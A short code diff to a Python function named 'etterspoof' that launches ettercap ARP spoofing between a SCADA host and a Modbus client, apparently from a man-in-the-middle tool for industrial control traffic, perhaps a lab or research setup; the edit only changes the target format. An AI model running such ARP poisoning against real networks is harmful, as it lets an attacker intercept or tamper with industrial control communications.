@@ -64,8 +64,8 @@ def etterspoof():
         print("\n\nEttercap is not enabled. Activating ARP Spoofing...\n\n")
         intrfce = input("Enter Interface Name: ") 
         time.sleep(2)
-
-        cmd = ["ettercap", "-TqD", "-i", intrfce, "-M", f"arp:remote", f"{nm_config.scada_mac}/{nm_config.scada_ip}//", f"{nm_config.modcli_mac}/{nm_config.modcli_ip}//"]
+        
+        cmd = ["ettercap", "-TqD", "-i", intrfce, "-M", "arp:remote", f"/{nm_config.scada_ip}//", f"/{nm_config.modcli_ip}//"]
         print(f"Executing: {' '.join(cmd)}")
         subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, start_new_session=True)
         time.sleep(5)
